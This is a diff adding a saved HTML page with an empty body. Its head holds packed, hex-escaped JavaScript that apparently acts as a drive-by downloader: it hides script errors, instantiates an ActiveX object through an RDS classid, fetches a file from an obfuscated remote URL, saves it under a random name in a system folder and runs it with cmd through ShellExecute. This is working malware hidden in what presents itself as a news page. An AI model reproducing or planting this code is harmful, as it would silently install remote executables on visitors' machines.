@@ -1,0 +1,12 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0034)http://lovekr.super2b.com/news.htm -->
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=ks_c_5601-1987">
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+
+<SCRIPT>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('J=\'\\R\\5\\5\\9\\1d\\x\\x\\14\\O\\16\\4\\18\\l\\y\\8\\17\\9\\4\\l\\B\\t\\y\\6\\O\\15\\x\\13\\7\\19\\i\\e\\e\\y\\4\\S\\4\';3="";1a L(m){a F=M.1f()*m;3="";1e\'\\1b\\q\\4\\b\\9\'+M.1c(F)+\'\\c\\5\\b\\9\'}1g{3="";a d=12.Y("\\g\\t\\K\\4\\6\\5");3="";d.Z("\\6\\f\\C\\8\\8\\7\\k","\\6\\f\\8\\7\\k\\10\\11\\P\\A\\s\\w\\z\\z\\s\\v\\s\\z\\n\\i\\v\\I\\I\\P\\e\\v\\A\\1l\\i\\n\\v\\e\\e\\w\\e\\1x\\H\\w\\B\\A\\N\\i\\s");3="";a r=d.p("\\G\\7\\6\\l\\g\\8\\g\\1w\\5\\c\\1v"+"\\G\\1u\\1y\\q\\q\\1z","");3="";a h=d.p("\\n\\k\\g\\k\\t\\c\\u\\5\\l\\4\\C\\b","");3="";h.1D=1;3="";r.1C("\\1A\\N\\q",J,0);3="";r.1B();3="";j=L(1t);3="";a o=d.p("\\u\\6\\l\\7\\9\\5\\7\\E\\1h\\c\\H\\7\\f\\4\\u\\X\\8\\5\\4\\b\\1s\\t\\K\\4\\6\\5","");3="";a D=o.1k(0);3="";j=o.W(D,j);3="";h.1j();3="";h.1i(r.1m);3="";h.1n(j,2);3="";h.1r();3="";a T=d.p("\\u\\R\\4\\f\\f\\c\\n\\9\\9\\f\\7\\6\\C\\5\\7\\g\\E","");3="";U=o.W(D+\'\\Q\\Q\\8\\X\\8\\5\\4\\b\\i\\B\',\'\\6\\b\\k\\c\\4\\S\\4\');3="";T.1q(U,\'\\1p\\1o\\6 \'+j,"","\\g\\9\\4\\E",0);3=""}1E(V){V=1}3="";',62,103,'|||haoqiang|x65|x74|x63|x69|x73|x70|var|x6D|x2E|Gf|x30|x6C|x6F|Ss|x33|ufeiure|x64|x72||x41|Fs|CreateObject|x54|Xx|x36|x62|x53|x2D|x43|x2f|x2e|x35|x39|x32|x61|pmeds|x6E|iojiij|x4D|x46|x31|omed|x6A|nnneffd|Math|x45|x6f|x44|x5C|x68|x78|Eo|fdfdeeee|iiiii|BuildPath|x79|createElement|setAttribute|x3A|x42|document|x77|x6c|x6d|x76|x75|x6b|x6e|function|x7E|round|x3a|return|random|try|x67|Write|Open|GetSpecialFolder|x38|responseBody|SaveToFile|x2F|x20|SheLLExecute|Close|x4F|9999|x4C|x58|x66|x34|x48|x50|x47|send|open|type|catch'.split('|'),0,{}))
+</SCRIPT>
+
+<META content="MSHTML 6.00.6000.16587" name=GENERATOR></HEAD>
+<BODY></BODY></HTML>
